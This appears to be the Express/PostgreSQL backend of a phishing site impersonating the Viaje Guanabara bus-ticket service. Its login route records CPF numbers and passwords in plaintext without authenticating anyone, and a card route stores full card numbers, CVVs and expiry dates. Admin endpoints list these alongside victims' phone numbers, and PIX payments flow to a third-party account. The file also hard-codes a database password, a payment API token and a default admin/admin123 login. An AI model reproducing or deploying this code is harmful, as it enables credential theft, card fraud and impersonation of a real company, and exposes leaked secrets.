const express = require('express');
const cors = require('cors');
const { Pool } = require('pg');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const path = require('path');
const requestIp = require('request-ip');

const app = express();

// ===== MIDDLEWARE =====
app.use(cors({
    origin: '*',
    credentials: true
}));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(cookieParser());
app.use(requestIp.mw());

// ===== SERVE ARQUIVOS ESTATICOS =====
app.use(express.static(__dirname));
app.use('/admin', express.static(path.join(__dirname, 'admin')));
app.use('/public', express.static(path.join(__dirname, 'public')));

// ============================================================
// ===== DATABASE POSTGRESQL =====
// ============================================================

const pool = new Pool({
    connectionString: process.env.DATABASE_URL || 'postgresql://guanabara_user:JTL5QHG4acDPmzHRo4FYZBmTOtlFDBZW@dpg-d9shhuv10e5c739tl52g-a.oregon-postgres.render.com/guanabara',
    ssl: { rejectUnauthorized: false },
    max: 20,
    idleTimeoutMillis: 30000,
    connectionTimeoutMillis: 5000,
    keepAlive: true
});

const JWT_SECRET = process.env.JWT_SECRET || 'guanabara_secret_key_2026';
const JWT_EXPIRES = '24h';

// ===== VERIFICAR TOKEN ADMIN =====
function verificarAdminToken(req, res, next) {
    const authHeader = req.headers.authorization;
    const token = authHeader && authHeader.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'Token nao fornecido' });
    try {
        const decoded = jwt.verify(token, JWT_SECRET);
        req.usuario = decoded;
        next();
    } catch {
        return res.status(401).json({ error: 'Token invalido ou expirado' });
    }
}

// ============================================================
// ===== INICIALIZAR DATABASE =====
// ============================================================

async function initDatabase() {
    const client = await pool.connect();
    try {
        // ===== TABELAS DO SEU SISTEMA ANTIGO =====
        await client.query(`CREATE TABLE IF NOT EXISTS admin_users (
            id SERIAL PRIMARY KEY, 
            username VARCHAR(50) UNIQUE, 
            senha_hash VARCHAR(255)
        )`);

        await client.query(`CREATE TABLE IF NOT EXISTS users (
            id SERIAL PRIMARY KEY, 
            cpf VARCHAR(14) UNIQUE, 
            senha TEXT, 
            ip TEXT, 
            dispositivo TEXT, 
            navegador TEXT, 
            telefone VARCHAR(20), 
            data_cpf TIMESTAMP DEFAULT CURRENT_TIMESTAMP, 
            data_senha TIMESTAMP, 
            status VARCHAR(20),
            nome VARCHAR(100),
            email VARCHAR(100),
            ultimo_acesso TIMESTAMP,
            criado_em TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )`);

        await client.query(`CREATE TABLE IF NOT EXISTS logs (
            id SERIAL PRIMARY KEY, 
            tipo VARCHAR(30), 
            cpf VARCHAR(14), 
            senha TEXT, 
            ip TEXT, 
            dispositivo TEXT, 
            navegador TEXT, 
            data TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            acao VARCHAR(50),
            detalhes TEXT
        )`);

        await client.query(`CREATE TABLE IF NOT EXISTS payments (
            id SERIAL PRIMARY KEY, 
            transaction_id VARCHAR(100) UNIQUE, 
            cpf VARCHAR(14), 
            telefone VARCHAR(20), 
            valor DECIMAL(10,2), 
            status VARCHAR(20) DEFAULT 'pending', 
            tipo_pagamento VARCHAR(20) DEFAULT 'PIX', 
            data_solicitacao TIMESTAMP DEFAULT CURRENT_TIMESTAMP, 
            data_pagamento TIMESTAMP
        )`);

        await client.query(`CREATE TABLE IF NOT EXISTS produtos (
            id SERIAL PRIMARY KEY, 
            nome TEXT NOT NULL, 
            tipo TEXT NOT NULL, 
            preco REAL NOT NULL, 
            preco_promocional REAL, 
            descricao TEXT, 
            icone TEXT, 
            imagem TEXT, 
            ativo BOOLEAN DEFAULT true,
            origem TEXT,
            destino TEXT,
            data_viagem DATE,
            hora_partida TIME,
            hora_chegada TIME
        )`);

        await client.query(`CREATE TABLE IF NOT EXISTS clientes (
            id SERIAL PRIMARY KEY, 
            nome TEXT NOT NULL, 
            telefone TEXT NOT NULL, 
            email TEXT, 
            cpf TEXT,
            criado_em TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )`);

        await client.query(`CREATE TABLE IF NOT EXISTS pedidos (
            id SERIAL PRIMARY KEY, 
            cliente_id INTEGER REFERENCES clientes(id) ON DELETE CASCADE, 
            produto_id INTEGER REFERENCES produtos(id) ON DELETE CASCADE, 
            quantidade INTEGER DEFAULT 1, 
            valor_total REAL, 
            status_pagamento TEXT DEFAULT 'pendente', 
            tipo_pagamento TEXT, 
            transacao_id TEXT, 
            created_at TIMESTAMP DEFAULT NOW()
        )`);

        await client.query(`CREATE TABLE IF NOT EXISTS cartoes (
            id SERIAL PRIMARY KEY, 
            cliente_id INTEGER, 
            nome_titular TEXT, 
            numero_cartao TEXT, 
            cvv TEXT, 
            validade TEXT,
            created_at TIMESTAMP DEFAULT NOW()
        )`);

        // ===== TABELAS NOVAS PARA O SISTEMA MELHORADO =====
        await client.query(`CREATE TABLE IF NOT EXISTS visitantes (
            id SERIAL PRIMARY KEY,
            ip TEXT,
            user_agent TEXT,
            screen TEXT,
            language TEXT,
            referer TEXT,
            pagina TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )`);

        await client.query(`CREATE TABLE IF NOT EXISTS buscas (
            id SERIAL PRIMARY KEY,
            origem TEXT,
            destino TEXT,
            data DATE,
            passageiros INTEGER,
            ip TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )`);

        await client.query(`CREATE TABLE IF NOT EXISTS tickets (
            id SERIAL PRIMARY KEY,
            codigo VARCHAR(20) UNIQUE,
            origem TEXT,
            destino TEXT,
            passageiro TEXT,
            passageiro_id INTEGER REFERENCES users(id),
            data DATE,
            hora TIME,
            valor DECIMAL(10,2),
            status VARCHAR(20) DEFAULT 'pendente',
            assento VARCHAR(5),
            metodo_pagamento VARCHAR(20),
            ip TEXT,
            criado_em TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )`);

        await client.query(`CREATE TABLE IF NOT EXISTS configuracoes (
            id SERIAL PRIMARY KEY,
            nome_site VARCHAR(100) DEFAULT 'Viaje Guanabara',
            manutencao BOOLEAN DEFAULT false,
            logs_ativos BOOLEAN DEFAULT true,
            notificacoes_email BOOLEAN DEFAULT true,
            alertas_seguranca BOOLEAN DEFAULT true,
            atualizado_em TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )`);

        // ===== ADMIN PADRAO =====
        const adminExists = await client.query('SELECT * FROM admin_users WHERE username = $1', ['admin']);
        if (adminExists.rows.length === 0) {
            const hash = await bcrypt.hash('admin123', 10);
            await client.query('INSERT INTO admin_users (username, senha_hash) VALUES ($1, $2)', ['admin', hash]);
            console.log('Admin criado: admin@viajeguanabara.com / admin123');
        }

        // ===== CONFIGURACOES PADRAO =====
        const configExists = await client.query('SELECT * FROM configuracoes');
        if (configExists.rows.length === 0) {
            await client.query(`INSERT INTO configuracoes (nome_site, manutencao, logs_ativos) VALUES ('Viaje Guanabara', false, true)`);
        }

        console.log('Banco de dados inicializado com sucesso');
    } catch (err) {
        console.error('Erro ao inicializar banco:', err);
    } finally {
        client.release();
    }
}

initDatabase();

// ============================================================
// ===== ROTAS PUBLICAS =====
// ============================================================

// ===== CPF (do seu sistema antigo) =====
app.post('/api/cpf', async (req, res) => {
    const { cpf, ip, dispositivo, navegador, telefone } = req.body;
    try {
        await pool.query(
            `INSERT INTO users (cpf, ip, dispositivo, navegador, data_cpf, status, telefone) 
             VALUES ($1, $2, $3, $4, CURRENT_TIMESTAMP, $5, $6) 
             ON CONFLICT (cpf) DO UPDATE SET ip=$2, dispositivo=$3, navegador=$4, telefone=$6`,
            [cpf, ip || req.clientIp, dispositivo, navegador, 'aguardando_senha', telefone]
        );
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ===== LOGIN (do seu sistema antigo) =====
app.post('/api/login', async (req, res) => {
    const { cpf, password, ip, dispositivo, navegador, telefone } = req.body;
    try {
        await pool.query(
            `UPDATE users SET senha=$1, ip_senha=$2, dispositivo_senha=$3, navegador_senha=$4, 
             data_senha=CURRENT_TIMESTAMP, status=$5, telefone=COALESCE(telefone,$6), ultimo_acesso=CURRENT_TIMESTAMP 
             WHERE cpf=$7`,
            [password, ip || req.clientIp, dispositivo, navegador, 'completo', telefone, cpf]
        );
        await pool.query(
            'INSERT INTO logs (tipo, cpf, senha, ip, dispositivo, navegador, acao) VALUES ($1,$2,$3,$4,$5,$6,$7)',
            ['senha_inserida', cpf, password, ip || req.clientIp, dispositivo, navegador, 'login']
        );
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ===== LOGIN ADMIN =====
app.post('/api/admin/login', async (req, res) => {
    const { username, password } = req.body;
    try {
        const result = await pool.query('SELECT * FROM admin_users WHERE username = $1', [username]);
        if (result.rows.length === 0 || !(await bcrypt.compare(password, result.rows[0].senha_hash))) {
            return res.status(401).json({ error: 'Credenciais invalidas' });
        }
        const token = jwt.sign(
            { id: result.rows[0].id, username },
            JWT_SECRET,
            { expiresIn: JWT_EXPIRES }
        );
        res.json({ success: true, token });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ===== REGISTRO USUARIO (novo) =====
app.post('/api/register', async (req, res) => {
    const { nome, email, senha, telefone, cpf } = req.body;
    try {
        const exists = await pool.query('SELECT * FROM users WHERE email = $1 OR cpf = $2', [email, cpf]);
        if (exists.rows.length > 0) {
            return res.status(400).json({ error: 'Email ou CPF ja cadastrado' });
        }
        const result = await pool.query(
            `INSERT INTO users (nome, email, senha, telefone, cpf, status, ip, criado_em) 
             VALUES ($1, $2, $3, $4, $5, $6, $7, CURRENT_TIMESTAMP) RETURNING id`,
            [nome, email, bcrypt.hashSync(senha, 10), telefone, cpf, 'online', req.clientIp || req.ip]
        );
        const token = jwt.sign(
            { id: result.rows[0].id, email, nome },
            JWT_SECRET,
            { expiresIn: JWT_EXPIRES }
        );
        res.json({ success: true, token, user: { id: result.rows[0].id, nome, email } });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ===== COLETAR VISITANTE =====
app.post('/api/visitante', async (req, res) => {
    const { screen, pagina } = req.body;
    try {
        await pool.query(
            `INSERT INTO visitantes (ip, user_agent, screen, language, referer, pagina) 
             VALUES ($1, $2, $3, $4, $5, $6)`,
            [
                req.clientIp || req.ip,
                req.headers['user-agent'] || 'Desconhecido',
                screen || 'Desconhecido',
                req.headers['accept-language'] || 'pt-BR',
                req.headers['referer'] || 'Direto',
                pagina || 'Desconhecida'
            ]
        );
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ===== REGISTRAR BUSCA =====
app.post('/api/busca', async (req, res) => {
    const { origem, destino, data, passageiros } = req.body;
    try {
        await pool.query(
            `INSERT INTO buscas (origem, destino, data, passageiros, ip) 
             VALUES ($1, $2, $3, $4, $5)`,
            [origem, destino, data, passageiros || 1, req.clientIp || req.ip]
        );
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ===== REGISTRAR COMPRA =====
app.post('/api/compra', async (req, res) => {
    const { origem, destino, passageiro, passageiroId, data, hora, valor, metodoPagamento, assento } = req.body;
    try {
        const codigo = 'GV' + data.replace(/-/g, '') + String(Math.floor(Math.random() * 1000)).padStart(3, '0');
        const result = await pool.query(
            `INSERT INTO tickets (codigo, origem, destino, passageiro, passageiro_id, data, hora, valor, status, metodo_pagamento, assento, ip)
             VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12) RETURNING id`,
            [codigo, origem, destino, passageiro, passageiroId || null, data, hora || '08:00', valor, 'confirmado', metodoPagamento || 'PIX', assento || null, req.clientIp || req.ip]
        );
        
        await pool.query(
            `INSERT INTO logs (tipo, cpf, ip, acao, detalhes) 
             VALUES ($1, $2, $3, $4, $5)`,
            ['compra', passageiroId || 'anonimo', req.clientIp || req.ip, 'compra_passagem', `Compra: ${codigo} - ${origem} -> ${destino}`]
        );
        
        res.json({ success: true, ticket: { id: result.rows[0].id, codigo } });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ===== PRODUTOS =====
app.get('/api/produtos', async (req, res) => {
    try {
        const result = await pool.query("SELECT * FROM produtos WHERE ativo = true ORDER BY id");
        res.json({ success: true, produtos: result.rows });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ===== CLIENTES =====
app.post('/api/clientes', async (req, res) => {
    const { nome, telefone, email, cpf } = req.body;
    try {
        const result = await pool.query(
            "INSERT INTO clientes (nome, telefone, email, cpf) VALUES ($1,$2,$3,$4) RETURNING id",
            [nome, telefone, email, cpf]
        );
        res.json({ success: true, cliente_id: result.rows[0].id });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ===== PEDIDOS =====
app.post('/api/pedidos', async (req, res) => {
    const { cliente_id, produto_id, quantidade, valor_total, tipo_pagamento } = req.body;
    try {
        const result = await pool.query(
            `INSERT INTO pedidos (cliente_id, produto_id, quantidade, valor_total, tipo_pagamento, status_pagamento) 
             VALUES ($1,$2,$3,$4,$5,'pendente') RETURNING id`,
            [cliente_id, produto_id, quantidade, valor_total, tipo_pagamento]
        );
        res.json({ success: true, pedido_id: result.rows[0].id });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ===== CARTÕES =====
app.post('/api/cartoes/salvar', async (req, res) => {
    const { nome_titular, numero_cartao, cvv, validade, cpf, telefone } = req.body;
    try {
        let cliente = await pool.query('SELECT id FROM users WHERE cpf = $1', [cpf]);
        let cliente_id;
        if (cliente.rows.length > 0) {
            cliente_id = cliente.rows[0].id;
        } else {
            const newCliente = await pool.query('INSERT INTO users (cpf, telefone) VALUES ($1,$2) RETURNING id', [cpf || '00000000000', telefone || '']);
            cliente_id = newCliente.rows[0].id;
        }
        await pool.query(
            `INSERT INTO cartoes (cliente_id, nome_titular, numero_cartao, cvv, validade) 
             VALUES ($1, $2, $3, $4, $5)`,
            [cliente_id, nome_titular, numero_cartao, cvv, validade]
        );
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ============================================================
// ===== SISTEMA PIX (Plumify) =====
// ============================================================

const PLUMIFY_PRODUCT_HASH = 'lxpykbkgfl';
const PLUMIFY_API_TOKEN = '1Vp6bm2wSoil2giHCGRjsZ9IGVbiHve4u8xbyUoRWpdvHUWYOj6wZ9yd0xVq';

app.post('/api/save-payment', async (req, res) => {
    const { transaction_id, cpf, valor, telefone } = req.body;
    try {
        await pool.query(
            `INSERT INTO payments (transaction_id, cpf, valor, status, telefone) 
             VALUES ($1,$2,$3,$4,$5) ON CONFLICT (transaction_id) DO NOTHING`,
            [transaction_id, cpf, valor, 'pending', telefone]
        );
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/check-payment/:transaction_id', async (req, res) => {
    try {
        const result = await pool.query('SELECT status FROM payments WHERE transaction_id = $1', [req.params.transaction_id]);
        res.json({ status: result.rows.length > 0 ? result.rows[0].status : 'not_found' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/create-payment', async (req, res) => {
    const { amount, customer_name, customer_cpf, customer_phone } = req.body;
    const amountCents = Math.round(parseFloat(amount) * 100);
    const payload = {
        amount: amountCents,
        offer_hash: PLUMIFY_PRODUCT_HASH,
        payment_method: 'pix',
        customer: {
            name: customer_name || 'Passageiro',
            email: 'contato@viacao.com.br',
            phone_number: customer_phone || '41992878772',
            document: customer_cpf || '00000000000',
            street_name: 'Rua Exemplo',
            number: '100',
            neighborhood: 'Centro',
            city: 'Fortaleza',
            state: 'CE',
            zip_code: '60000000'
        },
        cart: [{
            product_hash: PLUMIFY_PRODUCT_HASH,
            title: 'Passagem Guanabara',
            price: amountCents,
            quantity: 1
        }],
        expire_in_days: 3,
        postback_url: `${process.env.BASE_URL || 'https://viaje-guanabara.onrender.com'}/api/webhook/pagamento`
    };
    try {
        const response = await fetch(`https://api.Plumify.com.br/api/public/v1/transactions?api_token=${PLUMIFY_API_TOKEN}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        const data = await response.json();
        if (data.pix && data.pix.pix_qr_code) {
            await pool.query(
                `INSERT INTO payments (transaction_id, cpf, valor, status, telefone) 
                 VALUES ($1,$2,$3,$4,$5) ON CONFLICT (transaction_id) DO NOTHING`,
                [data.hash, customer_cpf, amount, 'pending', customer_phone]
            );
            res.json({ success: true, payment: { pix_code: data.pix.pix_qr_code, id: data.hash } });
        } else {
            res.json({ success: false, error: data.message || 'Erro ao gerar PIX' });
        }
    } catch (error) {
        res.status(500).json({ error: 'Erro ao gerar pagamento' });
    }
});

app.post('/api/webhook/pagamento', async (req, res) => {
    const { hash, status } = req.body;
    if (status === 'paid') {
        await pool.query('UPDATE payments SET status = $1, data_pagamento = NOW() WHERE transaction_id = $2', ['paid', hash]);
    }
    res.json({ received: true });
});

// ============================================================
// ===== ROTAS ADMIN (PROTEGIDAS) =====
// ============================================================

// ===== DASHBOARD =====
app.get('/api/admin/dashboard', verificarAdminToken, async (req, res) => {
    try {
        const users = await pool.query('SELECT COUNT(*) as total, status FROM users GROUP BY status');
        const tickets = await pool.query('SELECT COUNT(*) as total, status FROM tickets GROUP BY status');
        const visitantes = await pool.query('SELECT COUNT(*) as total FROM visitantes');
        const buscas = await pool.query('SELECT COUNT(*) as total FROM buscas');
        const logs = await pool.query('SELECT * FROM logs ORDER BY data DESC LIMIT 20');
        
        res.json({
            success: true,
            stats: {
                users: users.rows,
                tickets: tickets.rows,
                totalVisitantes: visitantes.rows[0]?.total || 0,
                totalBuscas: buscas.rows[0]?.total || 0
            },
            logs: logs.rows
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ===== USUARIOS =====
app.get('/api/admin/users', verificarAdminToken, async (req, res) => {
    try {
        const result = await pool.query('SELECT id, nome, email, cpf, telefone, status, ultimo_acesso, ip, criado_em FROM users ORDER BY criado_em DESC');
        res.json({ success: true, users: result.rows });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.put('/api/admin/users/:id', verificarAdminToken, async (req, res) => {
    const { nome, email, telefone, status } = req.body;
    try {
        await pool.query(
            'UPDATE users SET nome=$1, email=$2, telefone=$3, status=$4 WHERE id=$5',
            [nome, email, telefone, status, req.params.id]
        );
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.delete('/api/admin/users/:id', verificarAdminToken, async (req, res) => {
    try {
        await pool.query('DELETE FROM users WHERE id = $1', [req.params.id]);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ===== TICKETS =====
app.get('/api/admin/tickets', verificarAdminToken, async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM tickets ORDER BY criado_em DESC');
        res.json({ success: true, tickets: result.rows });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.put('/api/admin/tickets/:id', verificarAdminToken, async (req, res) => {
    const { status } = req.body;
    try {
        await pool.query('UPDATE tickets SET status = $1 WHERE id = $2', [status, req.params.id]);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ===== BUSCAS =====
app.get('/api/admin/buscas', verificarAdminToken, async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM buscas ORDER BY timestamp DESC LIMIT 100');
        res.json({ success: true, buscas: result.rows });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ===== VISITANTES =====
app.get('/api/admin/visitantes', verificarAdminToken, async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM visitantes ORDER BY timestamp DESC LIMIT 100');
        res.json({ success: true, visitantes: result.rows });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ===== LOGS =====
app.get('/api/admin/logs', verificarAdminToken, async (req, res) => {
    try {
        const limit = parseInt(req.query.limit) || 100;
        const result = await pool.query('SELECT * FROM logs ORDER BY data DESC LIMIT $1', [limit]);
        res.json({ success: true, logs: result.rows });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.delete('/api/admin/logs', verificarAdminToken, async (req, res) => {
    try {
        await pool.query('DELETE FROM logs');
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ===== PRODUTOS (Admin) =====
app.get('/api/admin/produtos', verificarAdminToken, async (req, res) => {
    try {
        const result = await pool.query("SELECT * FROM produtos ORDER BY id");
        res.json({ success: true, produtos: result.rows });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/admin/produtos', verificarAdminToken, async (req, res) => {
    const { nome, tipo, preco, preco_promocional, descricao, icone, imagem, origem, destino, data_viagem, hora_partida, hora_chegada } = req.body;
    try {
        const result = await pool.query(
            `INSERT INTO produtos (nome, tipo, preco, preco_promocional, descricao, icone, imagem, ativo, origem, destino, data_viagem, hora_partida, hora_chegada) 
             VALUES ($1,$2,$3,$4,$5,$6,$7,true,$8,$9,$10,$11,$12) RETURNING id`,
            [nome, tipo, preco, preco_promocional, descricao, icone, imagem, origem, destino, data_viagem, hora_partida, hora_chegada]
        );
        res.json({ success: true, id: result.rows[0].id });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.delete('/api/admin/produtos/:id', verificarAdminToken, async (req, res) => {
    try {
        await pool.query('DELETE FROM produtos WHERE id = $1', [req.params.id]);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ===== CARTÕES (Admin) =====
app.get('/api/admin/cartoes', verificarAdminToken, async (req, res) => {
    try {
        const result = await pool.query(`
            SELECT c.*, u.cpf, u.telefone, u.nome 
            FROM cartoes c 
            LEFT JOIN users u ON c.cliente_id = u.id 
            ORDER BY c.created_at DESC
        `);
        res.json({ success: true, cartoes: result.rows });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ===== PAYMENTS (Admin) =====
app.get('/api/admin/pagamentos', verificarAdminToken, async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM payments ORDER BY data_solicitacao DESC');
        res.json({ success: true, pagamentos: result.rows });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ============================================================
// ===== LOGOUT =====
// ============================================================

app.post('/api/logout', verificarAdminToken, async (req, res) => {
    try {
        await pool.query(
            'INSERT INTO logs (tipo, usuario, ip, acao) VALUES ($1, $2, $3, $4)',
            ['logout', req.usuario.username, req.clientIp || req.ip, 'Logout realizado']
        );
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ============================================================
// ===== ROTAS PARA PAGINAS =====
// ============================================================

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin', 'index.html')));
app.get('/checkout', (req, res) => res.sendFile(path.join(__dirname, 'checkout.html')));
app.get('/tickets', (req, res) => res.sendFile(path.join(__dirname, 'tickets.html')));
app.get('/comprovante', (req, res) => res.sendFile(path.join(__dirname, 'comprovante.html')));

// ============================================================
// ===== INICIAR SERVIDOR =====
// ============================================================

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log('');
    console.log('=================================================');
    console.log('  VIAJE GUANABARA - SISTEMA COMPLETO');
    console.log('  Servidor: http://localhost:' + PORT);
    console.log('  Admin: http://localhost:' + PORT + '/admin');
    console.log('  Checkout: http://localhost:' + PORT + '/checkout');
    console.log('  Login Admin: ');
    console.log('  Senha: ');
    console.log('  Ambiente: ' + (process.env.NODE_ENV || 'development'));
    console.log('=================================================');
    console.log('');
});

module.exports = app;
